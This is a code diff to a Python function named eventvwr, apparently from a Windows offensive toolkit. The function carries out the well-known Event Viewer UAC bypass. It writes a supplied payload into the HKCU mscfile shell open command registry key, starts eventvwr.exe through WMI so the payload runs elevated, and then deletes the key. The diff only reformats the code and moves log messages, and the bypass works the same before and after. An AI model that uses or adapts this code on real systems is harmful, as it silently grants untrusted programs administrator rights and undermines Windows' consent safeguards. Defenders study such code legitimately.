@@ -6,7 +6,6 @@ import os
 import wmi
 import time
 import _winreg
-import ctypes
 from core.prints import *
 
 wmi = wmi.WMI()
@@ -29,19 +28,14 @@ def eventvwr(payload):
 	print_info("Payload: {}".format(payload))
 	print_info("Attempting to create registry key")
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\mscfile\shell\open\command"))
-								
-		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))				
+		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
 		_winreg.CloseKey(key)
-		print_success("Registry key created")
 	except Exception as error:
 		print_error("Unable to create key")
 		return False
+	else:
+		print_success("Registry key created")
 
 	print_info("Pausing for 5 seconds before executing")
 	time.sleep(5)
@@ -49,7 +43,7 @@ def eventvwr(payload):
 	print_info("Attempting to create process")
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start eventvwr.exe",
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
 		if (result[1] == 0):
 			print_success("Process started successfully")
 		else:
@@ -63,9 +57,8 @@ def eventvwr(payload):
 
 	print_info("Attempting to remove registry key")
 	try:
-		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-							os.path.join("Software\Classes\mscfile\shell\open\command"))
-		print_success("Registry key was deleted")
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))
 	except Exception as error:
 		print_error("Unable to delete key")
 		return False
+	print_success("Registry key was deleted")
